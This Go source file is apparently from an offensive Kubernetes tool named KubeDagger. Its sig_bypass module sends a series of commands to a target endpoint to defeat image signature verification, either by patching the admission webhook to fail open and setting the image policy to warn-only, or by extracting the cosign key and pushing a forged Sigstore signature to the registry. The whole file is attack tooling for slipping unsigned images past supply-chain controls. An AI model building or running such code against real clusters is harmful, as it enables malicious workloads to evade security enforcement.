package sig_bypass

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type BypassResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool               `json:"success"`
}

func Execute(target, mode, targetImage, output string) error {
	result := &BypassResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch mode {
	case "disable-verify":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"identify_webhook", "locate image verification admission webhook configuration", "sig_find_webhook"},
			{"patch_webhook", "modify webhook failurePolicy to Ignore via API patch", "sig_patch_webhook"},
			{"disable_policy", "set ClusterImagePolicy to warn-only mode", "sig_disable_policy"},
			{"verify_bypass", "confirm unsigned images now pass admission", "sig_verify_bypass"},
		}
	default: // inject-sig
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"extract_pubkey", "extract trusted signing public key from cosign verification secret", "sig_extract_key"},
			{"generate_sig", "create forged Sigstore signature bundle for target image digest", "sig_generate"},
			{"upload_sig", "push forged signature to OCI registry as cosign attachment", "sig_upload"},
			{"verify_acceptance", "confirm image now passes signature verification", "sig_verify"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + mode + "#" + targetImage
		status := shared.SendCommand(target, "/sig_bypass", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
